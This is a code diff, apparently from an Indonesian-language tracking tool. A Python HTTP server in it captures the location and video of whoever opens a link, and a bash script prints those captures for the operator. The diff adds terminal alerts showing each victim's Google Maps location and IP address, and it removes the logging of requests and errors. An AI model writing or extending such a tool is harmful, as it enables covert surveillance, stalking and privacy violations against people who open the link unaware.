@@ -268,6 +268,9 @@ print_log_line() {
     FIRST|NEW)
       printf '  %s[%s]%s %s✔ Link dibuka%s — %s  %s(IP %s)%s\n' \
         "$D" "$t" "$R" "$GRN$B" "$R" "$dev" "$D" "$ip" "$R" ;;
+    LOC)
+      printf '  %s[%s]%s %s📍 Lokasi: %s%s  %s(IP %s)%s\n' \
+        "$D" "$t" "$R" "$CYN$B" "$dev" "$R" "$D" "$ip" "$R" ;;
     *)
       printf '  %s[%s] ↻ %s memuat ulang halaman  (IP %s)%s\n' "$D" "$t" "$dev" "$ip" "$R" ;;
   esac
@@ -338,8 +341,7 @@ def flush(token):
 
 class Handler(http.server.SimpleHTTPRequestHandler):
     def log_message(self, format, *args):
-        with open(logfile, "a") as f:
-            f.write(f"[HTTP] {self.client_address[0]} - {format % args}\n")
+        pass
 
     def do_GET(self):
         if self.path.split("?")[0] not in ("/", "/index.html"):
@@ -430,13 +432,16 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                     
                     with open(loc_log_file, "a") as f:
                         f.write(f"[{timestamp}] IP: {raw_ip} | Maps: {gmaps_link}\n")
+                    
+                    # Kirim log ke terminal utama
+                    with open(logfile, "a") as lf:
+                        t_str = datetime.now().strftime("%H:%M:%S")
+                        lf.write(f"{t_str}\tLOC\t{gmaps_link}\t{raw_ip}\t0\n")
                 
                 self.send_response(200)
                 self.end_headers()
                 self.wfile.write(b"OK")
             except Exception as e:
-                with open(logfile, "a") as f:
-                    f.write(f"[ERROR /save-location] {str(e)}\n")
                 self.send_error(500, str(e))
             return
 
@@ -479,8 +484,6 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                 self.end_headers()
                 self.wfile.write(b"Saved")
             except Exception as e:
-                with open(logfile, "a") as f:
-                    f.write(f"[ERROR /save-video] {str(e)}\n")
                 self.send_error(500, str(e))
             return
 
